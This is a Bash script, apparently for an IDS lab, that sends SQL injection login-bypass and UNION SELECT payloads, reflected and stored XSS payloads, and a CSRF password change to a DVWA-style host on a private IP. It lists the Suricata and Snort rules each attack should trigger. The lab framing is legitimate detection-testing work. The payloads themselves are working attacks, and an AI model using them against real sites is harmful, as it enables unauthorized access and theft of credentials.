#!/bin/bash

# Script Testing Payload - Bash
# Untuk testing SQLi, XSS, dan CSRF dari Kali Linux

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${RED}🔥 DVWA Payload Testing Script${NC}"
echo -e "${RED}================================${NC}\n"

# Ganti dengan IP Windows host kamu
BASE_URL="http://192.168.1.100:8000"
COOKIE_FILE="/tmp/dvwa_session.txt"

# ========================================
# 1. SQLi Testing - Login Bypass
# ========================================
echo -e "${YELLOW}[1] Testing SQLi - Login Bypass...${NC}"

curl -s -c $COOKIE_FILE -X POST "$BASE_URL/login.php" \
  -d "username=admin' OR '1'='1" \
  -d "password=anything" \
  -o /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✅ SQLi Login Bypass: SUCCESS${NC}"
    echo -e "${CYAN}   Triggered Rules: Suricata 100004, 100006 | Snort 300005, 300006${NC}\n"
else
    echo -e "${RED}❌ SQLi Login Bypass: FAILED${NC}\n"
fi

# ========================================
# 2. SQLi Testing - UNION SELECT
# ========================================
echo -e "${YELLOW}[2] Testing SQLi - UNION SELECT...${NC}"

declare -a payloads=(
    "1' OR '1'='1"
    "1' UNION SELECT 1,2,3,4 --"
    "1' UNION SELECT username, password, 3, created_at FROM users --"
)

for payload in "${payloads[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    
    response=$(curl -s -b $COOKIE_FILE "$BASE_URL/sqli.php?search=$encoded")
    
    if [[ $response == *"Hasil Pencarian"* ]] || [[ $response == *"Search Results"* ]]; then
        echo -e "${GREEN}✅ Payload: $payload${NC}"
        echo -e "${CYAN}   Triggered Rules: Suricata 100001, 100003, 100007 | Snort 300001, 300002${NC}"
    else
        echo -e "${RED}❌ Payload failed: $payload${NC}"
    fi
done
echo ""

# ========================================
# 3. XSS Testing - Reflected
# ========================================
echo -e "${YELLOW}[3] Testing XSS - Reflected...${NC}"

declare -a xss_payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=\"alert('XSS')\">"
    "<svg onload=\"alert('XSS')\">"
)

for payload in "${xss_payloads[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    
    response=$(curl -s -b $COOKIE_FILE "$BASE_URL/xss_reflected.php?name=$encoded")
    
    if [[ $response == *"$payload"* ]]; then
        echo -e "${GREEN}✅ XSS Reflected: $payload${NC}"
        echo -e "${CYAN}   Triggered Rules: Suricata 100010, 100012, 100014 | Snort 300010, 300011${NC}"
    else
        echo -e "${RED}❌ XSS Reflected failed${NC}"
    fi
done
echo ""

# ========================================
# 4. XSS Testing - Stored
# ========================================
echo -e "${YELLOW}[4] Testing XSS - Stored...${NC}"

response=$(curl -s -b $COOKIE_FILE -X POST "$BASE_URL/xss_stored.php" \
  -d "comment=<script>alert('Stored XSS')</script>")

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✅ XSS Stored: SUCCESS${NC}"
    echo -e "${CYAN}   Triggered Rules: Suricata 100011, 100013, 100015 | Snort 300012, 300013${NC}"
    echo -e "${YELLOW}   Note: Open page in browser to see payload executed${NC}\n"
else
    echo -e "${RED}❌ XSS Stored: FAILED${NC}\n"
fi

# ========================================
# 5. CSRF Testing
# ========================================
echo -e "${YELLOW}[5] Testing CSRF - Password Change...${NC}"

response=$(curl -s -b $COOKIE_FILE -X POST "$BASE_URL/csrf.php" \
  -d "new_password=hacked123" \
  -d "confirm_password=hacked123")

if [[ $response == *"berhasil"* ]] || [[ $response == *"success"* ]]; then
    echo -e "${GREEN}✅ CSRF Attack: SUCCESS${NC}"
    echo -e "${CYAN}   Triggered Rules: Suricata 100021 | Snort 300021${NC}"
    echo -e "${YELLOW}   Password changed to: hacked123${NC}\n"
else
    echo -e "${RED}❌ CSRF Attack: FAILED${NC}\n"
fi

# ========================================
# Summary
# ========================================
echo -e "\n${RED}================================${NC}"
echo -e "${GREEN}Testing Complete!${NC}"
echo -e "${RED}================================${NC}"
echo -e "\n${YELLOW}Check your IDS logs for alerts:${NC}"
echo -e "${CYAN}- Suricata: /var/log/suricata/fast.log${NC}"
echo -e "${CYAN}- Snort3: /var/log/snort/alert_fast.txt${NC}"
echo -e "\n${YELLOW}For manual testing, see PAYLOADS.md${NC}"

# Cleanup
rm -f $COOKIE_FILE
